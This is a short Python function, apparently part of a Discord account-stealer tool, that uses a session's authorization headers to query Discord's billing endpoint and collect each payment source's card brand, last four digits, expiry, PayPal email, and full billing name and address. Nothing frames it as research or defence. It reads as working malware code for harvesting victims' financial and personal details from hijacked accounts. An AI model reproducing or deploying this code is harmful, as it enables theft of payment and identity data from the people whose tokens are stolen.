from utils.libs import *
from utils.varables import *


def get_payments(self):
    payment_types = ["Credit Card", "Paypal"]
    url = f"https://discord.com/api/users/@me/billing/payment-sources"
    r = requests.get(url, headers=self.HEADERS)
    if r.status_code in [200, 201, 204]:
        payments = []
        for data in r.json():
            if int(data['type'] == 1):
                payments.append({'type': payment_types[int(data['type']) - 1],
                                 'valid': not data['invalid'],
                                 'brand': data['brand'],
                                 'last 4': data['last_4'],
                                 'expires': str(data['expires_year']) + "y " + str(data['expires_month']) + 'm',
                                 'billing name': data['billing_address']['name'],
                                 'country': data['billing_address']['country'],
                                 'state': data['billing_address']['state'],
                                 'city': data['billing_address']['city'],
                                 'zip code': data['billing_address']['postal_code'],
                                 'address': data['billing_address']['line_1'], })
            else:
                payments.append({'type': payment_types[int(data['type']) - 1],
                                 'valid': not data['invalid'],
                                 'email': data['email'], 'billing name': data['billing_address']['name'],
                                 'country': data['billing_address']['country'],
                                 'state': data['billing_address']['state'],
                                 'city': data['billing_address']['city'],
                                 'zip code': data['billing_address']['postal_code'],
                                 'address': data['billing_address']['line_1'], })
        return payments
    else:
        return []